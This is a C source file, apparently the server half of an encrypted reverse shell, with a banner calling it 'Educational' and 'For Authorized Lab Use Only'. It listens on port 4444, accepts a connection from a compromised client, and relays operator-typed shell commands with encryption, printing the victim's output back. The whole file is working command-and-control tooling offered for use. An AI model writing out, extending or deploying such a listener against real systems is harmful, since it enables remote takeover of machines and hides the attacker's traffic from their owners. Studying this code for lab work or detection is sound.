// Codes by vision

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "../common/crypto.h"

#define DEFAULT_PORT 4444

void handle_client(int client_socket) {
    char buffer[BUFFER_SIZE];
    char command[BUFFER_SIZE];
    ssize_t bytes_received;

    printf("[+] Client connected!\n");
    printf("[*] Enter commands (type 'exit' to disconnect client):\n");

    while (1) {
        memset(command, 0, BUFFER_SIZE);
        memset(buffer, 0, BUFFER_SIZE);

        printf("shell> ");
        fflush(stdout);

        if (fgets(command, BUFFER_SIZE, stdin) == NULL) {
            break;
        }

        command[strcspn(command, "\n")] = 0;

        if (strlen(command) == 0) {
            continue;
        }

        if (strcmp(command, "exit") == 0) {
            printf("[*] Disconnecting client...\n");
            break;
        }

        encrypt_data(command, strlen(command));

        if (send(client_socket, command, strlen(command), 0) < 0) {
            perror("[-] Send failed");
            break;
        }

        bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) {
            printf("[-] Client disconnected\n");
            break;
        }

        decrypt_data(buffer, bytes_received);
        buffer[bytes_received] = '\0';

        printf("%s", buffer);
    }

    close(client_socket);
    printf("[*] Client session ended\n");
}

int main(int argc, char *argv[]) {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    int port = DEFAULT_PORT;
    int opt = 1;

    if (argc > 1) {
        port = atoi(argv[1]);
    }

    printf("===========================================\n");
    printf("  Educational Reverse Shell - Server\n");
    printf("  For Authorized Lab Use Only\n");
    printf("===========================================\n\n");

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("[-] Socket creation failed");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("[-] Setsockopt failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Bind failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    if (listen(server_socket, 5) < 0) {
        perror("[-] Listen failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    printf("[+] Server listening on port %d\n", port);
    printf("[*] Waiting for connections...\n\n");

    while (1) {
        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_len);
        if (client_socket < 0) {
            perror("[-] Accept failed");
            continue;
        }

        printf("[+] Connection from %s:%d\n", 
               inet_ntoa(client_addr.sin_addr), 
               ntohs(client_addr.sin_port));

        handle_client(client_socket);

        printf("\n[*] Waiting for new connections...\n\n");
    }

    close(server_socket);
    return 0;
}
